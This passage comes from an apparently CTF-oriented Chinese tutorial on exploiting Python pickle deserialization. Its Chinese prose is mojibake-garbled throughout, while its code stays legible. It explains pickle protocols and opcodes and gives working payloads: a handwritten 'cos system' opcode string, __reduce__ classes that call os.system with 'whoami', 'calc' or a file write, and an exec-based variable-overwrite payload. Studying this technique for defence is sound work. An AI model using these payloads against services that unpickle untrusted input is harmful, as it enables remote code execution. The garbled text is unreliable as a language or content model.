ç›´åˆ°æ‰€æœ‰æ“ä½œè¢«å®Œæˆ. 4.2 opcodeç®€ä»‹ pickleç”±äºæœ‰ä¸åŒçš„å®ç°ç‰ˆæœ¬ï¼Œåœ¨py3å’Œpy2ä¸­å¾—åˆ°çš„opcodeä¸ç›¸åŒã€‚ä½†æ˜¯pickleå¯ä»¥å‘ä¸‹å…¼å®¹ï¼ˆæ‰€ä»¥ç”¨v0å°±å¯ä»¥åœ¨æ‰€æœ‰ç‰ˆæœ¬ä¸­æ‰§è¡Œï¼‰ã€‚ç›®å‰ï¼Œpickleæœ‰6ç§ç‰ˆæœ¬ã€‚ import pickle a={'1': 1, '2': 2} print(f'# åŸå˜é‡ï¼š{a!r}')# è¾“å‡ºaçš„å€¼ for i in range(4): print(f'pickleç‰ˆæœ¬{i}',pickle.dumps(a,protocol=i)) # è¾“å‡ºï¼š # åŸå˜é‡:{'1': 1, '2': 2} Pcikeç‰ˆæœ¬0 b'(dp0 V1 p1 I1 sV2 p2 I2 s.' Pcikeç‰ˆæœ¬1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' Pcikeç‰ˆæœ¬2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' Pcikeç‰ˆæœ¬3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle3ç‰ˆæœ¬çš„opcodeç¤ºä¾‹ï¼š # 'abcd' b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.' # \\x80ï¼šåè®®å¤´å£°æ˜ # \\x03ï¼šåè®®ç‰ˆæœ¬ # \\x04\\x00\\x00\\x00ï¼šæ•°æ®é•¿åº¦ï¼š4 # abcdï¼šæ•°æ® # qï¼šå‚¨å­˜æ ˆé¡¶çš„å­—ç¬¦ä¸²é•¿åº¦ï¼šä¸€ä¸ªå­—èŠ‚ï¼ˆå³\\x00ï¼‰ # \\x00ï¼šæ ˆé¡¶ä½ç½® # .ï¼šæ•°æ®æˆªæ­¢ pickle0ç‰ˆæœ¬çš„éƒ¨åˆ†opcodeè¡¨æ ¼ï¼š Opcode Mnemonic Data type loaded onto the stack Example S STRING String Sâ€™fooâ€™ V UNICODE Unicode Vfo\\u006f I INTEGER Integer I42 â€¦ â€¦ â€¦ â€¦ æœ¬è¡¨æ ¼æˆªå–äº†BHçš„pdfä¸Šçš„éƒ¨åˆ†å†…å®¹ï¼Œå®Œæ•´è¡¨æ ¼å¯ä»¥ç›´æ¥åœ¨åŸpdfä¸­æ‰¾åˆ°ã€‚ 4.3 æŒ‡ä»¤é›† å½“å‰ç”¨äºpicklingçš„åè®®å…±æœ‰6ç§, ä½¿ç”¨çš„åè®®ç‰ˆæœ¬è¶Šé«˜, è¯»å–ç”Ÿæˆçš„pickleæ‰€éœ€çš„Pythonç‰ˆæœ¬å°±è¦è¶Šæ–°. v0ç‰ˆåè®®æ˜¯åŸå§‹çš„\"äººç±»å¯è¯»\"åè®®, å¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„Python. v1ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼, å®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„Pythonå…¼å®¹. v2ç‰ˆåè®®æ˜¯åœ¨Python 2.3ä¸­å¼•å…¥çš„, å®ƒä¸ºå­˜å‚¨new-style classæä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶, å‚é˜…PEP 307. v3ç‰ˆåè®®æ·»åŠ äºPython 3.0, å®ƒå…·æœ‰å¯¹byteså¯¹è±¡çš„æ˜¾å¼æ”¯æŒ, ä¸”æ— æ³•è¢«Python 2.xæ‰“å¼€, è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®, ä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»–Python 3ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®. v4ç‰ˆåè®®æ·»åŠ äºPython 3.4, å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡, èƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡, è¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–, å‚é˜…PEP 3154. v5ç‰ˆåè®®æ·»åŠ äºPython 3.8, å®ƒæ”¯æŒå¸¦å¤–æ•°æ®, åŠ é€Ÿå¸¦å†…æ•°æ®å¤„ç†. # Pickle opcodes. See pickletools.py for extensive docs. The listing # here is in kind-of alphabetical order of 1-character pickle code. # pickletools groups them by purpose. MARK = b'(' # push special markobject on stack STOP = b'.' # every pickle ends with STOP POP = b'0' # discard topmost stack item POP_MARK = b'1' # discard stack top through topmost markobject DUP = b'2' # duplicate top stack item FLOAT = b'F' # push float object; decimal string argument INT = b'I' # push integer or bool; decimal string argument BININT = b'J' # push four-byte signed int BININT1 = b'K' # push 1-byte unsigned int LONG = b'L' # push long; decimal string argument BININT2 = b'M' # push 2-byte unsigned int NONE = b'N' # push None PERSID = b'P' # push persistent object; id is taken from string arg BINPERSID = b'Q' # \" \" \" ; \" \" \" \" stack REDUCE = b'R' # apply callable to argtuple, both on stack STRING = b'S' # push string; NL-terminated string argument BINSTRING = b'T' # push string; counted binary string argument SHORT_BINSTRING= b'U' # \" \" ; \" \" \" \" &lt; 256 bytes UNICODE = b'V' # push Unicode string; raw-unicode-escaped'd argument BINUNICODE = b'X' # \" \" \" ; counted UTF-8 string argument APPEND = b'a' # append stack top to list below it BUILD = b'b' # call __setstate__ or __dict__.update() GLOBAL = b'c' # push self.find_class(modname, name); 2 string args DICT = b'd' # build a dict from stack items EMPTY_DICT = b'}' # push empty dict APPENDS = b'e' # extend list on stack by topmost stack slice GET = b'g' # push item from memo on stack; index is string arg BINGET = b'h' # \" \" \" \" \" \" ; \" \" 1-byte arg INST = b'i' # build &amp; push class instance LONG_BINGET = b'j' # push item from memo on stack; index is 4-byte arg LIST = b'l' # build list from topmost stack items EMPTY_LIST = b']' # push empty list OBJ = b'o' # build &amp; push class instance PUT = b'p' # store stack top in memo; index is string arg BINPUT = b'q' # \" \" \" \" \" ; \" \" 1-byte arg LONG_BINPUT = b'r' # \" \" \" \" \" ; \" \" 4-byte arg SETITEM = b's' # add key+value pair to dict TUPLE = b't' # build tuple from topmost stack items EMPTY_TUPLE = b')' # push empty tuple SETITEMS = b'u' # modify dict by adding topmost key+value pairs BINFLOAT = b'G' # push float; arg is 8-byte float encoding TRUE = b'I01 ' # not an opcode; see INT docs in pickletools.py FALSE = b'I00 ' # not an opcode; see INT docs in pickletools.py # Protocol 2 PROTO = b'\\x80' # identify pickle protocol NEWOBJ = b'\\x81' # build object by applying cls.__new__ to argtuple EXT1 = b'\\x82' # push object from extension registry; 1-byte index EXT2 = b'\\x83' # ditto, but 2-byte index EXT4 = b'\\x84' # ditto, but 4-byte index TUPLE1 = b'\\x85' # build 1-tuple from stack top TUPLE2 = b'\\x86' # build 2-tuple from two topmost stack items TUPLE3 = b'\\x87' # build 3-tuple from three topmost stack items NEWTRUE = b'\\x88' # push True NEWFALSE = b'\\x89' # push False LONG1 = b'\\x8a' # push long from &lt; 256 bytes LONG4 = b'\\x8b' # push really big long _tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3] # Protocol 3 (Python 3.x) BINBYTES = b'B' # push bytes; counted binary string argument SHORT_BINBYTES = b'C' # \" \" ; \" \" \" \" &lt; 256 bytes # Protocol 4 SHORT_BINUNICODE = b'\\x8c' # push short string; UTF-8 length &lt; 256 bytes BINUNICODE8 = b'\\x8d' # push very long string BINBYTES8 = b'\\x8e' # push very long bytes string EMPTY_SET = b'\\x8f' # push empty set on the stack ADDITEMS = b'\\x90' # modify set by adding topmost stack items FROZENSET = b'\\x91' # build frozenset from topmost stack items NEWOBJ_EX = b'\\x92' # like NEWOBJ but work with keyword only arguments STACK_GLOBAL = b'\\x93' # same as GLOBAL but using names on the stacks MEMOIZE = b'\\x94' # store top of the stack in memo FRAME = b'\\x95' # indicate the beginning of a new frame # Protocol 5 BYTEARRAY8 = b'\\x96' # push bytearray NEXT_BUFFER = b'\\x97' # push next out-of-band buffer READONLY_BUFFER = b'\\x98' # make top of stack readonly ä¸Šæ–‡è°ˆåˆ°äº†opcodeæ˜¯æœ‰å¤šä¸ªç‰ˆæœ¬çš„, åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶å¯ä»¥é€šè¿‡protocol=numæ¥é€‰æ‹©opcodeçš„ç‰ˆæœ¬, æŒ‡å®šçš„ç‰ˆæœ¬å¿…é¡»å°äºç­‰äº5. 4.4 Pickletools ä½¿ç”¨pickletoolså¯ä»¥æ–¹ä¾¿çš„å°†opcodeè½¬åŒ–ä¸ºä¾¿äºè‚‰çœ¼è¯»å–çš„å½¢å¼ import pickletools data=b\"\\x80\\x03cbuiltins exec q\\x00X\\x13\\x00\\x00\\x00key1=b'1' key2=b'2'q\\x01\\x85q\\x02Rq\\x03.\" pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL 'builtins exec' 17: q BINPUT 0 19: X BINUNICODE \"key1=b'1' key2=b'2'\" 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 4.5 ä¾‹å­-æ–‡å­—è¯´æ˜ è¿™é‡Œç¿»åˆ°å…¶ä»–æ–‡ç« é‡‡ç”¨äº†æ–‡å­—å™è¿°çš„æ–¹å¼ä»‹ç»äº†ä¸€ä¸ªç®€å•çš„opcodeä¾‹å­ï¼š è¿™é‡Œç”¨ä¸€æ®µç®€çŸ­çš„å­—èŠ‚ç æ¥æ¼”ç¤ºåˆ©ç”¨è¿‡ç¨‹: cos system (S'whoami' tR. ä¸Šæ–‡ä¸­çš„å­—èŠ‚ç å…¶å®å°±æ˜¯__import__('os').system(*('whoami',)), ä¸‹é¢æ¥åˆ†è§£åˆ†æä¸€ä¸‹: cos =&gt; å¼•å…¥æ¨¡å— os. system =&gt; å¼•ç”¨ system, å¹¶å°†å…¶æ·»åŠ åˆ° stack. (S'whoami' =&gt; æŠŠå½“å‰ stack å­˜åˆ° metastack, æ¸…ç©º stack, å†å°† 'whoami' å‹å…¥ stack. t =&gt; stack ä¸­çš„å€¼å¼¹å‡ºå¹¶è½¬ä¸º tuple, æŠŠ metastack è¿˜åŸåˆ° stack, å†å°† tuple å‹å…¥ stack. R =&gt; system(*('whoami',)). . =&gt; ç»“æŸå¹¶è¿”å›å½“å‰æ ˆé¡¶å…ƒç´ . éœ€è¦æ³¨æ„çš„æ˜¯, å¹¶ä¸æ˜¯æ‰€æœ‰çš„å¯¹è±¡éƒ½èƒ½ä½¿ç”¨pickleè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–, ä¾‹å¦‚æ–‡ä»¶å¯¹è±¡å’Œç½‘ç»œå¥—æ¥å­—å¯¹è±¡ä»¥åŠä»£ç å¯¹è±¡å°±ä¸å¯ä»¥. 0x05 æ¼æ´åˆ©ç”¨ 5.1 æ¼æ´åŸç† æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘__reduce__()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç . ç®€å•æ¥è¯´, __reduce__()é­”æœ¯æ–¹æ³•ç±»ä¼¼äºPHPä¸­çš„__wakeup()æ–¹æ³•, åœ¨ååºåˆ—åŒ–æ—¶ä¼šå…ˆè°ƒç”¨__reduce__()é­”æœ¯æ–¹æ³•. 1.å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸², é‚£ä¹ˆå°†ä¼šå»å½“å‰ä½œç”¨åŸŸä¸­æŸ¥æ‰¾å­—ç¬¦ä¸²å€¼å¯¹åº”åå­—çš„å¯¹è±¡, å°†å…¶åºåˆ—åŒ–ä¹‹åè¿”å›. 2.å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå…ƒç»„, è¦æ±‚æ˜¯2åˆ°6ä¸ªå‚æ•°(Python3.8æ–°åŠ å…¥å…ƒç»„çš„ç¬¬å…­é¡¹). i.ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯è°ƒç”¨çš„å¯¹è±¡. ii.ç¬¬äºŒä¸ªæ˜¯è¯¥å¯¹è±¡æ‰€éœ€çš„å‚æ•°å…ƒç»„, å¦‚æœå¯è°ƒç”¨å¯¹è±¡ä¸æ¥å—å‚æ•°åˆ™å¿…é¡»æä¾›ä¸€ä¸ªç©ºå…ƒç»„. iii.ç¬¬ä¸‰ä¸ªæ˜¯ç”¨äºè¡¨ç¤ºå¯¹è±¡çš„çŠ¶æ€çš„å¯é€‰å…ƒç´ , å°†è¢«ä¼ ç»™å‰è¿°çš„__setstate__()æ–¹æ³•, å¦‚æœå¯¹è±¡æ²¡æœ‰æ­¤æ–¹æ³•, åˆ™è¿™ä¸ªå…ƒç´ å¿…é¡»æ˜¯å­—å…¸ç±»å‹å¹¶ä¼šè¢«æ·»åŠ è‡³__dict__å±æ€§ä¸­. iv.ç¬¬å››ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é¡¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ . v.ç¬¬äº”ä¸ªæ˜¯ç”¨äºè¿”å›è¿ç»­é”®å€¼å¯¹çš„è¿­ä»£å™¨çš„å¯é€‰å…ƒç´ . vi.ç¬¬å…­ä¸ªæ˜¯ä¸€ä¸ªå¸¦æœ‰(obj, state)ç­¾åçš„å¯è°ƒç”¨å¯¹è±¡çš„å¯é€‰å…ƒç´ . è¿™é‡Œä¾æ—§å±•ç¤ºä¸€ä¸‹å°è¿ªçš„Demoï¼Œæµ…æµ…äº†è§£Pythonååºåˆ—åŒ–æ¼æ´çš„ä¸ºä½•ä¼šäº§ç”Ÿ import pickle import os #ååºåˆ—åŒ–å®‰å…¨æ¼æ´äº§ç”Ÿ-DEMO class A(object): # å®šä¹‰æ„é€ å‡½æ•°ï¼Œå°†ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†èµ‹å€¼ def __init__(self, func, arg): self.func = func self.arg = arg print('This is A') # å®šä¹‰reduceæ–¹æ³•ï¼Œè¿™é‡Œå°†ä¼ å…¥çš„å‚æ•°åˆ†åˆ«å½“åšäº†å‡½æ•°åŠå‚æ•° def __reduce__(self): print('ååºåˆ—åŒ–è°ƒç”¨') return (self.func, self.arg) a = A(os.system, ('calc',)) p_a = pickle.dumps(a) pickle.loads(p_a) print('==========') print(p_a) å¾ˆæ˜æ˜¾å¦‚æœæˆ‘ä»¬æ­¤æ—¶è¿è¡Œç¨‹åºçš„è¯ï¼Œå°±ä¼šæ‰§è¡Œcalcå‘½ä»¤ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€äº›å¸¦æ¶æ„æ•°æ®çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå°†å…¶ä¼ å…¥åˆ°æŸä¸ªå…·æœ‰ååºåˆ—åŒ–åŠŸèƒ½çš„ç‚¹ï¼Œé‚£å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ•°æ®ï¼Œå¯ä»¥è¿›ä¸€æ­¥å¼€å±•åç»­å·¥ä½œäº†ã€‚ 5.2 åˆ©ç”¨æ€è·¯ ä»»æ„ä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œã€‚ å˜é‡è¦†ç›–ï¼Œé€šè¿‡è¦†ç›–ä¸€äº›å‡­è¯è¾¾åˆ°ç»•è¿‡èº«ä»½éªŒè¯çš„ç›®çš„ã€‚ 5.3 åˆæ­¥è®¤è¯†ï¼špickle EXPçš„ç®€å•demo import pickle import os class genpoc(object): def __reduce__(self): s = \"\"\"echo test &gt;poc.txt\"\"\" # è¦æ‰§è¡Œçš„å‘½ä»¤ return os.system, (s,) # reduceå‡½æ•°å¿…é¡»è¿”å›å…ƒç»„æˆ–å­—ç¬¦ä¸² e = genpoc() poc = pickle.dumps(e) print(poc) # æ­¤æ—¶ï¼Œå¦‚æœ pickle.loads(poc)ï¼Œå°±ä¼šæ‰§è¡Œå‘½ä»¤ å˜é‡è¦†ç›– import pickle key1 = b'321' key2 = b'123' class A(object): def __reduce__(self): return (exec,(\"key1=b'1' key2=b'2'\",)) a = A() pickle_a = pickle.dumps(a) print(pickle_a) pickle.loads(pickle_a) print(key1, key2) è¾“å‡ºï¼š b\"\\x80\\x04\\x95/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x04exec\\x94\\x93\\x94\\x8c\\x13key1=b'1' key2=b'2'\\x94\\x85\\x94R\\x94.\" b'1' b'2' 5.4 å¦‚ä½•æ‰‹å†™opcode åœ¨CTFä¸­ï¼Œå¾ˆå¤šæ—¶å€™éœ€è¦ä¸€æ¬¡æ‰§è¡Œå¤šä¸ªå‡½æ•°æˆ–ä¸€æ¬¡è¿›è¡Œå¤šä¸ªæŒ‡ä»¤ï¼Œæ­¤æ—¶å°±ä¸èƒ½å…‰ç”¨ __reduce__ æ¥è§£å†³é—®é¢˜ï¼ˆreduceä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œå½“execè¢«ç¦ç”¨æ—¶ï¼Œå°±ä¸èƒ½ä¸€æ¬¡æ‰§è¡Œå¤šæ¡æŒ‡ä»¤äº†ï¼‰ï¼Œè€Œéœ€è¦æ‰‹åŠ¨æ‹¼æ¥æˆ–æ„é€ opcodeäº†ã€‚æ‰‹å†™opcodeæ˜¯pickleååºåˆ—åŒ–æ¯”è¾ƒéš¾çš„åœ°æ–¹ã€‚ åœ¨è¿™é‡Œå¯ä»¥ä½“ä¼šåˆ°ä¸ºä½•pickleæ˜¯ä¸€ç§è¯­è¨€ï¼Œç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œåªè¦ç¬¦åˆpickleè¯­æ³•ï¼Œå°±å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œç­‰æ“ä½œã€‚ æ ¹æ®å‰æ–‡ä¸åŒç‰ˆæœ¬çš„opcodeå¯ä»¥çœ‹å‡ºï¼Œç‰ˆæœ¬0çš„opcodeæ›´æ–¹ä¾¿é˜…è¯»ï¼Œæ‰€ä»¥æ‰‹åŠ¨ç¼–å†™æ—¶ï¼Œä¸€èˆ¬é€‰ç”¨ç‰ˆæœ¬0çš„opcodeã€‚ä¸‹æ–‡ä¸­ï¼Œæ‰€æœ‰opcodeä¸ºç‰ˆæœ¬0çš„opcodeã€‚ 5.4.1 å¸¸ç”¨opcodeè§£æ ä¸ºäº†å……åˆ†ç†è§£æ ˆçš„ä½œç”¨ï¼Œå¼ºçƒˆå»ºè®®ä¸€è¾¹çœ‹åŠ¨å›¾ä¸€è¾¹å­¦ä¹ opcodeçš„ä½œç”¨ï¼š ç”±äºpickleåº“ä¸­çš„æ³¨é‡Šä¸æ˜¯å¾ˆè¯¦ç»†ï¼Œç½‘ä¸Šçš„å…¶ä»–èµ„æ–™ä¹Ÿæ²¡æœ‰å…·ä½“åœ°æŠŠæ ˆå’Œmemoä¸Šçš„å˜åŒ–è®²æ¸…æ¥šï¼Œä»¥ä¸‹çš„æ¯ä¸ªopcodeçš„æ“ä½œéƒ½æ˜¯hachp1å¸ˆå‚…ç»è¿‡å®éªŒéªŒè¯å¹¶ä¸”å°½å¯èƒ½å°†æ ˆå’Œmemoä¸Šçš„å˜åŒ–è§£é‡Šæ¸…æ¥šï¼Œå¸¸ç”¨çš„opcodeå¦‚ä¸‹ï¼š opcode æè¿° å…·ä½“å†™æ³• æ ˆä¸Šçš„å˜åŒ– memoä¸Šçš„å˜åŒ– c è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ–importä¸€ä¸ªæ¨¡å—ï¼ˆæ³¨ï¼šä¼šè°ƒç”¨importè¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ c[module] [instance] è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  o å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ o è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ æ—  i ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ i[module] [callable] è¿™ä¸ªè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„æ•°æ®éƒ½å‡ºæ ˆï¼Œå‡½æ•°è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„å¯¹è±¡ï¼‰å…¥æ ˆ æ—  N å®ä¾‹åŒ–ä¸€ä¸ªNone N è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  S å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ Sâ€™xxxâ€™ ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·ã€'ç­‰pythonå­—ç¬¦ä¸²å½¢å¼ï¼‰ è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  V å®ä¾‹åŒ–ä¸€ä¸ªUNICODEå­—ç¬¦ä¸²å¯¹è±¡ Vxxx è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  I å®ä¾‹åŒ–ä¸€ä¸ªintå¯¹è±¡ Ixxx è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  F å®ä¾‹åŒ–ä¸€ä¸ªfloatå¯¹è±¡ Fx.x è·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  R é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•° R å‡½æ•°å’Œå‚æ•°å‡ºæ ˆï¼Œå‡½æ•°çš„è¿”å›å€¼å…¥æ ˆ æ—  . ç¨‹åºç»“æŸï¼Œæ ˆé¡¶çš„ä¸€ä¸ªå…ƒç´ ä½œä¸ºpickle.loads()çš„è¿”å›å€¼ . æ—  æ—  ( å‘æ ˆä¸­å‹å…¥ä¸€ä¸ªMARKæ ‡è®° ( MARKæ ‡è®°å…¥æ ˆ æ—  t å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ t MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  ) å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„ ) ç©ºå…ƒç»„å…¥æ ˆ æ—  l å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨ l MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  ] å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨ ] ç©ºåˆ—è¡¨å…¥æ ˆ æ—  d å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰ d MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œè·å¾—çš„å¯¹è±¡å…¥æ ˆ æ—  } å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸ } ç©ºå­—å…¸å…¥æ ˆ æ—  p å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³memo_n pn æ—  å¯¹è±¡è¢«å‚¨å­˜ g å°†memo_nçš„å¯¹è±¡å‹æ ˆ gn å¯¹è±¡è¢«å‹æ ˆ æ—  0 ä¸¢å¼ƒæ ˆé¡¶å¯¹è±¡ 0 æ ˆé¡¶å¯¹è±¡è¢«ä¸¢å¼ƒ æ—  b ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½® b æ ˆä¸Šç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆ æ—  s å°†æ ˆçš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºkey-valueå¯¹ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸ºkeyï¼‰ä¸­ s ç¬¬ä¸€ã€äºŒä¸ªå…ƒç´ å‡ºæ ˆï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰æ·»åŠ æ–°å€¼æˆ–è¢«æ›´æ–° æ—  u å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆkey-valueå¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­ u MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œå­—å…¸è¢«æ›´æ–° æ—  a å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­ a æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–° æ—  e å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­ e MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–° æ—  æ­¤å¤–ï¼Œ TRUE å¯ä»¥ç”¨ I è¡¨ç¤ºï¼š b'I01 ' ï¼› FALSE ä¹Ÿå¯ä»¥ç”¨ I è¡¨ç¤ºï¼š b'I00 ' ï¼Œå…¶ä»–opcodeå¯ä»¥åœ¨pickleåº“çš„æºä»£ç ä¸­æ‰¾åˆ°ã€‚ ç”±è¿™äº›opcodeæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š 